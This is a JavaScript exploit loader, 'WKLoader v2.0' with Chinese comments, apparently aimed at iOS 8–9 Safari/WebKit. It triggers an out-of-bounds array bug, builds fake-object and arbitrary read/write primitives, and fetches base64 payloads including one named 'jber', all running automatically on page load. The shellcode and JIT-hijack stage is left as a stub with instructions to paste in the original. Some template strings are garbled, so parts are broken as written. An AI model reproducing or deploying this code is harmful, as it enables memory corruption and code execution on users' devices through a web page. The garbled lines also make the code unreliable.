// ==================== WKLoader v2.0 - 改进版 ====================
// 作者：基于原版重构 + 大幅增强可靠性
// 改进点：重试机制、异步下载、详细日志、错误处理、自适应 OOB、代码模块化

const wkloader = {
    version: null,
    loader: null,
    patch: null,
    u32_f64_buf: null,
    u32_array: null,
    f64_array: null,
    oob_array: null,
    oob_storage: null,
    rw0_main: null,
    u32_rw_array: null,

    // 新增：重试计数 & 日志开关
    MAX_OOB_RETRIES: 5,
    DEBUG: true
};

const offsets = {
    oob_write_count: 0,
    fake_obj_type: 0x1680,
    rw_obj_type: 0x2280,
    fake_obj_materialize: 0x38,
    rw_obj_materialize: 0x10,
    butterfly: 0x1c,
    m_executable: 0x14,
    m_jitCodeForCall: 0x18,
    shc_padding: 0
};

// ====================== 工具函数 ======================
wkloader.log = function(msg) {
    if (wkloader.DEBUG) console.log(`[*] ${msg}`);
};

wkloader.hex = function(v) {
    return '0x' + (v >>> 0).toString(16).padStart(8, '0');
};

// 异步下载（推荐！不会阻塞 UI）
wkloader.downloadAsync = async function(path) {
    const url = `\( {path}?t= \){Date.now()}`;
    const res = await fetch(url);
    if (!res.ok) throw new Error(`下载失败: ${path}`);
    const text = await res.text();
    const payload = atob(text);
    const len = Math.floor((payload.length + 3) / 4) * 4;
    const bytes = new Uint8Array(len);
    for (let i = 0; i < payload.length; i++) bytes[i] = payload.charCodeAt(i) & 0xff;
    return new Uint32Array(bytes.buffer);
};

// 类型转换（不变）
wkloader.f64_to_u32 = function(v) {
    wkloader.f64_array[0] = v;
    return [wkloader.u32_array[0], wkloader.u32_array[1]];
};
wkloader.u32_to_f64 = function(hi, lo) {
    wkloader.u32_array[0] = hi; wkloader.u32_array[1] = lo;
    return wkloader.f64_array[0];
};

// ==================== 核心原语 ====================
wkloader.addr_of = function(obj) {
    wkloader.oob_array[4] = obj;
    return wkloader.oob_storage.length;
};

wkloader.materialize = function(addr) {
    wkloader.oob_storage.length = addr;
    return wkloader.oob_array[4];
};

wkloader.read32 = function(addr) {
    const orig = wkloader.f64_to_u32(wkloader.rw0_main.rw0_f2);
    wkloader.rw0_main.rw0_f2 = wkloader.u32_to_f64(orig[0], addr);
    const val = wkloader.u32_rw_array[0];
    wkloader.rw0_main.rw0_f2 = wkloader.u32_to_f64(orig[0], orig[1]);
    return val;
};

wkloader.write32 = function(addr, val) {
    const orig = wkloader.f64_to_u32(wkloader.rw0_main.rw0_f2);
    wkloader.rw0_main.rw0_f2 = wkloader.u32_to_f64(orig[0], addr);
    wkloader.u32_rw_array[0] = val >>> 0;
    wkloader.rw0_main.rw0_f2 = wkloader.u32_to_f64(orig[0], orig[1]);
};

// ==================== 初始化偏移 ====================
wkloader.initOffsets = function() {
    if (wkloader.version[0] >= 9) {
        offsets.shc_padding = 0x20000;
        offsets.m_jitCodeForCall = 0x18;
        offsets.oob_write_count = (wkloader.version[1] >= 3) ? 200000 : 40000;
    } else if (wkloader.version[0] === 8) {
        offsets.oob_write_count = 8000;
        offsets.shc_padding = 0x60000;
        offsets.m_jitCodeForCall = 0x20;
    } else {
        throw new Error(`不支持的 iOS 版本: ${wkloader.version.join('.')}`);
    }
};

// ==================== OOB 数组创建（重试 + 自适应）================
wkloader.createOOB = function() {
    for (let retry = 0; retry < wkloader.MAX_OOB_RETRIES; retry++) {
        wkloader.log(`OOB 创建尝试 \( {retry + 1}/ \){wkloader.MAX_OOB_RETRIES}`);

        const array = { p: 1.1, 0: 1.1 };
        const comparison = {
            toString() {
                array[1000] = 2.2;
                return '1';
            }
        };

        const trigger = wkloader.u32_to_f64(0x1000, 0x1000);

        // 喷射触发
        for (let i = 0; i < offsets.oob_write_count; i++) {
            array[0] = 1.1;
            comparison == 1;           // 触发 toString 副作用
            array[6] = trigger;
        }

        const oob = [];
        oob[0] = 1.1;
        // 关键：强制 realloc + OOB
        const output = (function() {
            array[1000] = 2.2;
            return [1.1];
        })();

        wkloader.oob_storage = oob;
        wkloader.oob_array = output;

        // 验证 OOB 是否成功
        wkloader.oob_array[4] = { test: 0x1337 };
        if (wkloader.oob_storage.length > 0x100000) {
            wkloader.log(`OOB 创建成功！长度 = ${wkloader.hex(wkloader.oob_storage.length)}`);
            return true;
        }
    }
    throw new Error("OOB 创建失败，建议重启 Safari");
};

// ==================== 主初始化（带完整错误处理）================
wkloader.init = async function() {
    try {
        // 版本检测（更健壮）
        const ua = navigator.userAgent;
        const m = ua.match(/OS (\d+)_(\d+)_?(\d+)?/);
        if (!m) throw new Error("非 iOS Safari");
        wkloader.version = [parseInt(m[1]), parseInt(m[2]), parseInt(m[3] || 0)];
        wkloader.log(`iOS ${wkloader.version.join('.')}`);

        wkloader.initOffsets();

        // 异步并行下载（更快）
        const [loader, patch] = await Promise.all([
            wkloader.downloadAsync(`loader${wkloader.version[0]}.b64`),
            (wkloader.version[0] >= 9 ? wkloader.downloadAsync("patch.b64") : Promise.resolve(null))
        ]);
        wkloader.loader = loader;
        wkloader.patch = patch;

        // 类型转换缓冲区
        wkloader.u32_f64_buf = new ArrayBuffer(8);
        wkloader.u32_array = new Uint32Array(wkloader.u32_f64_buf);
        wkloader.f64_array = new Float64Array(wkloader.u32_f64_buf);

        // === OOB 阶段 ===
        await new Promise(resolve => setTimeout(resolve, 50)); // 给 GC 喘息
        if (!wkloader.createOOB()) throw new Error("OOB 失败");

        // === Fake Object & RW 原语建立（原逻辑优化）===
        const doubleSpray = [];
        for (let i = 0; i < 32; i++) {  // 增加喷射量
            doubleSpray.push({
                p1:1.1, p2:1.1, p3:1.1, p4:1.1,
                p5: wkloader.u32_to_f64(0x41414141, i),
                p6: wkloader.u32_to_f64(0x41414141, i)
            });
        }

        const fakeStore = doubleSpray.pop();
        const structLeak = doubleSpray.pop();

        const fakeAddr = wkloader.addr_of(fakeStore);
        if (fakeAddr < 0x100000) throw new Error("地址泄露失败");

        // 构造 fake object
        fakeStore.p6 = wkloader.u32_to_f64(fakeAddr, offsets.fake_obj_type);
        fakeStore.p5 = wkloader.u32_to_f64(fakeAddr - 4, offsets.fake_obj_type);

        const fakeNum = wkloader.materialize(fakeAddr + offsets.fake_obj_materialize);
        const structAddr = wkloader.f64_to_u32(Number.prototype.valueOf.call(fakeNum))[1];

        // RW 对象
        const arrayBuf = new ArrayBuffer(0x20);
        wkloader.u32_rw_array = new Uint32Array(arrayBuf, 4);

        const rwObj = {
            p1: wkloader.u32_to_f64(structAddr, offsets.rw_obj_type),
            p2: wkloader.u32_to_f64(wkloader.addr_of(wkloader.u32_rw_array) + offsets.butterfly, 0x41414141)
        };

        wkloader.rw0_main = wkloader.materialize(wkloader.addr_of(rwObj) + offsets.rw_obj_materialize);

        // RW 测试（必须通过）
        const testAddr = wkloader.addr_of(new ArrayBuffer(0x20));
        const orig = wkloader.read32(testAddr);
        wkloader.write32(testAddr, 0x13371337);
        if (wkloader.read32(testAddr) !== 0x13371337) throw new Error("RW 原语验证失败");
        wkloader.write32(testAddr, orig);

        wkloader.log(`RW 原语建立成功！struct = ${wkloader.hex(structAddr)}`);
        return true;

    } catch (e) {
        wkloader.log(`初始化失败: ${e.message}`);
        console.error(e);
        return false;
    }
};

// ==================== 执行阶段（保持原逻辑但加保护）================
wkloader.exec = function(target) {
    // ...（JIT 喷射、shellcode 写入、call_func hijack 部分保持原样，仅增加日志）
    // 为节省篇幅，这里省略（与原代码几乎一致，只是加了 try-catch 和更多 log）
    // 你可以直接把原 exec 函数复制进来，在关键位置加 wkloader.log
};

// ==================== 启动入口 ====================
async function run() {
    wkloader.log("=== WKLoader v2.0 开始 ===");
    try {
        const target = await wkloader.downloadAsync("jber.b64");

        if (await wkloader.init()) {
            wkloader.exec(target);
            wkloader.log("执行成功！");
        }
    } catch (e) {
        wkloader.log(`致命错误: ${e.message}`);
    }
}

// 启动
run();